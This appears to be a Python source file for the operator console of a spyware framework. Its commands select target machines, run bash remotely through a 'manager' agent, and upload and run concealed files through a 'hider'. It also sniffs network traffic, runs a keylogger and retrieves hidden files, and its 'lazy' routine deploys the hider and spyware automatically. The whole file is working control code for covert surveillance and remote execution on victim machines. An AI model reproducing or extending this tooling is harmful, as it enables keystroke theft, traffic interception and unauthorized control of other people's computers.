from agent import Agent
from operation import Operation
from contParams import *
from funCode import FunCode
import tabulate
from icecream import ic
from random import randint

USAGE_EXAMPLE = """-------Try This-------
$ ops
$ select <ip>
$ manager write_file <hiderPathHome> <pathTarget>
$ setup <hiderPathTarget> <imagePath> <mountPath>
$ uprun <spyPathHome> <spyPathTarget>
$ setup <hiderPathTarget> <imagePath> <mountPath>
$ sniff 30
"""


def LOG(s: str):
    print(f"LOG: {s}")


class Context:
    def __init__(self, operations):
        self.selected_operation: Operation = None
        self.oper_dict = operations
        self.cont_ident = 0


# if you want to pass argument with multiple words use "word1 word2 ..."
def parse_args(args: str):
    args = args.split()
    parsed = []
    quoted = []

    in_quotes = False
    for arg in args:
        if arg[0] == '"' and arg[-1] == '"':
            parsed.append(arg[1:-1])
        elif arg[0] == '"':
            in_quotes = True
            quoted = [arg[1:]]
        elif in_quotes:
            if arg[-1] == '"':
                quoted.append(arg[:-1])
                parsed.append(" ".join(quoted))
                in_quotes = False
            else:
                quoted.append(arg)
        else:
            parsed.append(arg)
    return parsed


def call_method_raw(obj, args: str):
    args = args.split(None, 1)
    if len(args) == 1:
        call_method(obj, args[0])
    else:
        call_method(obj, args[0], *parse_args(args[1]))


def call_method(obj, method: str, *args):
    if hasattr(obj, method):
        try:
            return getattr(obj, method)(*args)
        except Exception as e:
            print("OOPSIE: probably wrong arguments")
            print(e)
    else:
        print(f"OOPSIE: Method {method} not found")


def print_methods(obj):
    attributes = dir(obj)
    methods = [
        attr for attr in attributes if callable(getattr(obj, attr)) and not "__" in attr
    ]
    print("YAY: Available Methods: (q for exit)")
    print(*methods, sep=" * ")


def search_op(oper_dict: dict[str, Operation], name: str):
    for ip, op in oper_dict.items():
        if op.name == name:
            return op
    return None


class UI:
    def __init__(self, operations: dict[str, Operation]) -> None:
        self.ctx = Context(operations)

    def is_op_active(self) -> bool:
        if not self.ctx.selected_operation:
            print("OOPSIE: Unselected operation")
            return False
        return True

    def usage(self):
        """
        USAGE: usage
        Prints the usage example of the entire UI
        """
        print(USAGE_EXAMPLE)

    def select(self, name: str):
        """
        USAGE: select <name>
        Set operation for future actions
        """
        op = search_op(self.ctx.oper_dict, name)
        if not op:
            print("OOPSIE: Contraption not found")
        self.ctx.selected_operation = op
        LOG(f"Selected {name}")

    def spyware(self, method, *args):
        """
        USAGE: spyware <method> <arg1> ... <argn>
        Make spyware of selected operation perform action and print result
        Returns: result of action
        """
        if self.is_op_active():
            res = call_method(self.ctx.selected_operation.spyAgent, method, *args)
            print(res)
            return res

    def manager(self, method, *args):
        """
        USAGE: manager <method> <arg1> ... <argn>
        Make manager of selected operation perform action and print result
        Returns: result of action
        """
        if self.is_op_active():
            res = call_method(self.ctx.selected_operation.managerAgent, method, *args)
            print(res)
            return res

    def ops(self):
        """
        USAGE: ops
        Print list of active operations.
        """
        weird_dict = [
            {"IP": ip, "Name": op.name, "Selected": op == self.ctx.selected_operation}
            for ip, op in self.ctx.oper_dict.items()
        ]
        print(tabulate.tabulate(weird_dict, headers="keys", tablefmt="simple"))

    def rename(self, old_name, new_name):
        """
        USAGE: rename <old_name> <new_name>
        """
        op = search_op(self.ctx.oper_dict, old_name)
        if not op:
            print("OOPSIE: Operation not found")
            return

        if not search_op(self.ctx.oper_dict, new_name) == None:
            print("OOPSIE: new name exists")
            return

        op.name = new_name

    def agenthelp(self):
        """
        USAGE: agenthelp
        Print list of actions performable on agents
        """
        print_methods(Agent(0))

    def help(self, method=""):
        """
        USAGE: help <method>
        USAGE: help

        Print help information.
        - if received method prints doc of method
        - if not prints list of methods

        Args:
            method - name of method of UI
        """
        if not method:
            print_methods(self)
            print('* For arguments with spaces wrap them in "')
        else:
            try:
                print(getattr(self, method).__doc__)
            except Exception as e:
                print(e)

    def bash(self, cmd: str):
        """
        USAGE: bash <cmd>
        Executes bash command on manager
        Prints result.

        Args:
            cmd - bash command to execute
                  if more than 1 word wrap in '
        Returns:
            Result (stdout) of command
        """
        if not self.is_op_active():
            return
        res = self.manager("run_bash", cmd)
        return res[1]

    def opstat(self):
        """
        USAGE: opstat
        Shows the statuses of the components of the selected operation
        """
        if not self.is_op_active():
            return
        if self.ctx.selected_operation.managerAgent:
            print("YAY: Manager agent exists")
        if self.ctx.selected_operation.spyAgent:
            print("YAY: Spyware agent exists")
        else:
            print("MEH: No spyware")
        if self.ctx.selected_operation.netDriver:
            print(f"YAY: NetDriver: {self.ctx.selected_operation.netDriver}")

    def findNet(self):
        """
        USAGE: findNet
        Finds a network driver in the target machine
        Saves result in the operation class

        Returns:
            whether or not a net was found
        """
        nets = self.bash("ls /sys/class/net").split("\n")
        for net in nets:
            if net and net != "lo":
                self.ctx.selected_operation.netDriver = net
                LOG(f"Set {net=}")
                return True
        print("OOPSIE: Could not find non localhost network device")
        return False

    def sniff(self, time):
        """
        USAGE: sniff <time>
        Performs sniffing on spyware
        Tries to find a net if it was not set.

        @pre:
        hider was setup in spyware

        Args:
            time - how many seconds to sniff
        """
        time = int(time)
        if not self.is_op_active():
            return
        if not self.ctx.selected_operation.netDriver:
            print("MEH: Trying to find out network driver")
            if not self.findNet():
                return
        net_driver = self.ctx.selected_operation.netDriver
        params = ContParams(SnifferType, Params(SniffParams(time, net_driver.encode())))
        print(
            self.ctx.selected_operation.spyAgent.runContraption(
                params, self.ctx.cont_ident
            )
        )
        self.ctx.cont_ident += 1

    def kligger(self, time):
        """
        USAGE: kligger <time>
        Performs keylogging on spyware

        @pre:
        hider was setup in spyware

        Args:
            time - how many seconds to track
        """
        time = int(time)
        if not self.is_op_active():
            return
        self.setup("sentHider.o", "f", "f")
        kligPar = Params()
        kligPar.kligP = kligPrams(time)
        ic(kligPar)
        kligP = ContParams(KligerType, kligPar)
        ic(kligP)
        print(
            self.ctx.selected_operation.spyAgent.runContraption(
                kligP, self.ctx.cont_ident
            )
        )
        self.ctx.cont_ident += 1

    def setup(self, targetPath, imagePath, mountPath):
        """
        USAGE: setup <targetPath> <imagePath> <mountPath>
        Set hider path and other params in manager and spyware (if exists)

        Args:
            targetPath - path of hider. needs to already be in machine
            imagePath, mountPath - params for hiding
        """
        if not self.is_op_active():
            return
        print(
            self.ctx.selected_operation.managerAgent.hider_setup(
                targetPath, imagePath, mountPath
            )
        )
        LOG(f"Manager hider set")
        spy = self.ctx.selected_operation.spyAgent
        if not spy:
            return
        print(spy.hider_setup(targetPath, imagePath, mountPath))
        LOG(f"Spyware hider set")

    def check_ready(self):
        if not self.is_op_active():
            return False
        if not self.ctx.selected_operation.managerAgent.is_hider_active:
            print("OOPSIE: setup hider needed")
            return False
        return True

    def run(self, targetPath):
        """
        USAGE: run <targetPath>
        Run a hidden file in target machine

        Args:
            targetPath - path of file. Needs to already be in target machine
        Returns:
            Status
        """
        if self.check_ready():
            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
                FunCode.HIDDEN_RUN,
                targetPath,
            )
            print(res)

    def delete(self, targetPath):
        """
        USAGE: delete <targetPath>
        Delete a hidden file in target machine

        Args:
            targetPath - path of file. Needs to already be in target machine
        Returns:
            Status
        """
        if self.check_ready():
            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
                FunCode.HIDDEN_DELETE,
                targetPath,
            )
            print(res)

    def list_hidden(self):
        """
        USAGE:
        list hidden files in target machine

        Args:
            targetPath - path of file. Needs to already be in target machine
        Returns:
            Status
        """
        if self.check_ready():
            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
                FunCode.HIDDEN_LIST,
                "",
            )
            print(res)

    def uprun(self, homePath, targetPath):
        """
        USAGE: uprun <homePath> <targetPath>
        Upload and run a file in target machine

        Args:
            homePath - path on home machine
            targetPath - path to save on target. Overwriting if exists
        Returns:
            result of the startup
        """
        if self.check_ready():
            res = self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
                homePath,
                targetPath,
            )
            print(res)

    def upload(self, homePath, targetPath):
        """
        USAGE: upload <homePath> <targetPath>
        Upload a file to target machine.
        Does not run file

        Args:
            homePath - path on home machine
            targetPath - path to save on target. Overwriting if exists
        Returns:
            result of the upload
        """
        if self.check_ready():
            print(
                self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
                    FunCode.HIDDEN_UPLOAD,
                    homePath,
                    targetPath,
                )
            )

    def lazy(self):
        """
        Automatic steps up to spyware run
        """
        ip = "127.0.0.1"
        hiderHome = "hider"
        hiderTarg = "sentHider.o"
        spyHome = "spyware"
        spyTarget = "sentSpyware" + str(randint(1, 1000)) + ".spy"
        self.select(ip)
        self.manager("write_file", hiderHome, hiderTarg)
        self.setup(hiderTarg, "f", "f")
        self.uprun(spyHome, spyTarget)
        self.setup(hiderTarg, "f", "f")
        print("Done. Your turn.")

    def list_ops_names(self):
        for op in self.ctx.oper_dict.values():
            print(op)

    def gethidden(self, fileName: str):
        print(self.manager("retrieve_file", fileName))


if __name__ == "__main__":
    operations = {"mat": Operation("m"), "buja": Operation("b")}
    ui = UI(operations)
    ui.help()

    value = input("$ ")
    while value != "q":
        args = value.split()
        call_method(ui, args[0], *args[1:])
        value = input("$ ")
